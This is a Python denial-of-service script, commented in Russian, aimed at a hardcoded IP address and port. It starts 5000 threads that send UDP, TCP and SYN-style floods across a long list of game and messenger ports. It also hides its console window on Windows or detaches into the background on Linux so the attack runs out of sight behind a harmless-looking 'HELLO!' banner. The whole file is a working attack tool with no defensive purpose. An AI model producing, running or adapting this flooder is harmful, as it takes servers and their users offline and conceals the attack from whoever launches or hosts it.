#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import threading
import time
import random
import sys
import platform
import ctypes
import os

# ===== ЦЕЛЬ =====
TARGET_IP = "185.9.145.66"
TARGET_PORT = 25587

# ===== МОЩНОСТЬ =====
THREADS = 5000

# ===== ПОРТЫ ДЛЯ ВСЕХ ИГР И МЕССЕНДЖЕРОВ =====
ATTACK_PORTS = [
    # Мессенджеры
    443, 80, 5222, 5228, 5223, 5242, 50000, 50100, 50200, 50300, 50400, 50500,
    50600, 50700, 50800, 50900, 51000, 30000, 30010, 30020, 30030, 30040, 30050,
    5242, 5243, 9785, 31337, 3478, 3479, 3480, 3481, 19302, 19305, 8080,
    
    # Игры
    7777, 8080, 8887, 9997, 30211, 30212, 30213, 9339,
    25565, 25587, 19132,
    27015, 27016, 27017, 27018, 27019, 27020, 27021, 27022, 27023, 27024,
    27025, 27026, 27027, 27028, 27029, 27030,
    7000, 7100, 7200, 7300, 7400, 7500, 7600, 7700, 7800, 7900, 8000,
    27000, 27010, 27020, 27030, 27040, 27050,
    9000, 9100, 9200, 9300, 9400, 9500, 9600, 9700, 9800, 9900, 9999,
    4444, 5050, 5190,
    6672, 61455, 61456, 61457, 61458,
    3074, 3075,
    25200, 25250, 25300,
    1119, 1120,
    5000, 5100, 5200, 5300, 5400, 5500,
    49152, 50000, 52000, 54000, 56000, 58000, 60000, 62000, 64000, 65535,
    27036, 5795, 4338,
    13000, 13005, 13200,
    3478, 3479, 3480, 3658, 10093, 20009, 30000, 40000, 50000
]

# ===== СТАТИСТИКА =====
sent = 0
failed = 0
start_time = time.time()
lock = threading.Lock()
running = True

def show_hello():
    """Показывает HELLO! и продолжает работу"""
    print("\n" + "="*50)
    print("              HELLO!")
    print("="*50 + "\n")
    time.sleep(1)

def hide_window():
    """Прячет окно (для Windows)"""
    if platform.system() == "Windows":
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

def daemonize():
    """Отвязывается от терминала (для Linux)"""
    if platform.system() == "Linux":
        try:
            if os.fork() > 0:
                sys.exit(0)
            os.setsid()
            if os.fork() > 0:
                sys.exit(0)
        except:
            pass

def udp_flood():
    """UDP-флуд по всем портам"""
    global sent, running
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(1400)
    while running:
        try:
            port = random.choice(ATTACK_PORTS)
            sock.sendto(data, (TARGET_IP, port))
            with lock:
                sent += 1
        except:
            with lock:
                failed += 1

def tcp_flood():
    """TCP-флуд для нагрузки"""
    global sent, running
    while running:
        try:
            port = random.choice(ATTACK_PORTS)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            s.connect((TARGET_IP, port))
            s.send(random._urandom(512))
            s.close()
            with lock:
                sent += 1
        except:
            with lock:
                failed += 1

def syn_style_flood():
    """SYN-подобная нагрузка"""
    global sent, running
    while running:
        try:
            port = random.choice(ATTACK_PORTS)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.05)
            s.connect((TARGET_IP, port))
            with lock:
                sent += 1
        except:
            with lock:
                failed += 1

def main():
    global running
    
    # 1. Показываем HELLO!
    show_hello()
    
    # 2. Прячем окно
    hide_window()
    
    # 3. Отвязываемся от терминала (для Linux)
    daemonize()
    
    # 4. Запускаем атаку
    print("[⚡] Атака запущена...")
    for i in range(THREADS):
        if i % 3 == 0:
            threading.Thread(target=udp_flood).start()
        elif i % 3 == 1:
            threading.Thread(target=tcp_flood).start()
        else:
            threading.Thread(target=syn_style_flood).start()
    
    # 5. Ждём завершения
    try:
        while running:
            time.sleep(1)
    except KeyboardInterrupt:
        running = False
        print("\n[🛑] Остановлено")

if __name__ == "__main__":
    main()